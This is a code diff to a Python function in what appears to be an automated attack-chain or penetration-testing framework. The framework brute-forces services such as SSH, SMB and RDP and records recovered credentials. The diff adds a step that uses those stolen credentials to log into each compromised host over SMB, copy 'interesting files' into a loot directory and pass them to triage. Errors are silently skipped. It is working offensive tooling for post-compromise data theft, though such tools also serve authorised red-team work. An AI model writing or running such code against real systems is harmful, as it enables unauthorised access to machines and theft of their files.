@@ -44,6 +44,8 @@ def build_chain_executors(
     passwords: Sequence[str] = (),
     services: Sequence[str] = ("ssh", "ftp", "smb", "rdp", "telnet", "sql"),
     triage: Optional[Callable[[Sequence[str]], dict]] = None,
+    file_looter=None,
+    loot_dir: str = "/captures/loot/files",
     contexts: Optional[Dict[str, dict]] = None,
 ) -> Tuple[Dict[Phase, Callable[[str], Tuple[bool, str]]], Dict[str, dict]]:
     """Return (executors, contexts). `contexts[target]` accumulates the chain's
@@ -122,7 +124,27 @@ def build_chain_executors(
         book.add_hosts(c.get("hosts") or [])
         for cred in c.get("creds") or []:
             book.credentials.append(cred)
-        files = c.get("files") or []
+        files = list(c.get("files") or [])
+        loot_notes: List[str] = []
+        # With recovered creds, pull interesting files off each credited host (SMB)
+        # straight into the forensic triage below. One pull per unique host.
+        if file_looter is not None:
+            seen_hosts = set()
+            for cred in c.get("creds") or []:
+                host = getattr(cred, "ip", None)
+                if not host or host in seen_hosts:
+                    continue
+                seen_hosts.add(host)
+                try:
+                    pulled, notes = file_looter.loot_host(
+                        host, getattr(cred, "username", ""), getattr(cred, "secret", ""),
+                        dest=loot_dir)
+                except Exception as error:                    # loot is best-effort
+                    loot_notes.append(f"{host}: file-loot failed ({type(error).__name__})")
+                    continue
+                files.extend(pulled)
+                loot_notes.extend(notes)
+            c["files"] = files
         triaged = {}
         if files:
             tri = triage
@@ -131,9 +153,13 @@ def build_chain_executors(
             triaged = tri(files) or {}
         c["loot"] = {"hosts": len(c.get("hosts") or []),
                      "credentials": len(c.get("creds") or []),
+                     "files": len(files),
                      "triage": triaged}
+        if loot_notes:
+            c["loot"]["file_notes"] = loot_notes
         return True, (f"looted {len(c.get('hosts') or [])} host(s), "
                       f"{len(c.get('creds') or [])} credential(s)"
+                      + (f", pulled {len(files)} file(s)" if files else "")
                       + (f", triaged {len(triaged)} artifact(s)" if triaged else ""))
 
     executors: Dict[Phase, Callable[[str], Tuple[bool, str]]] = {
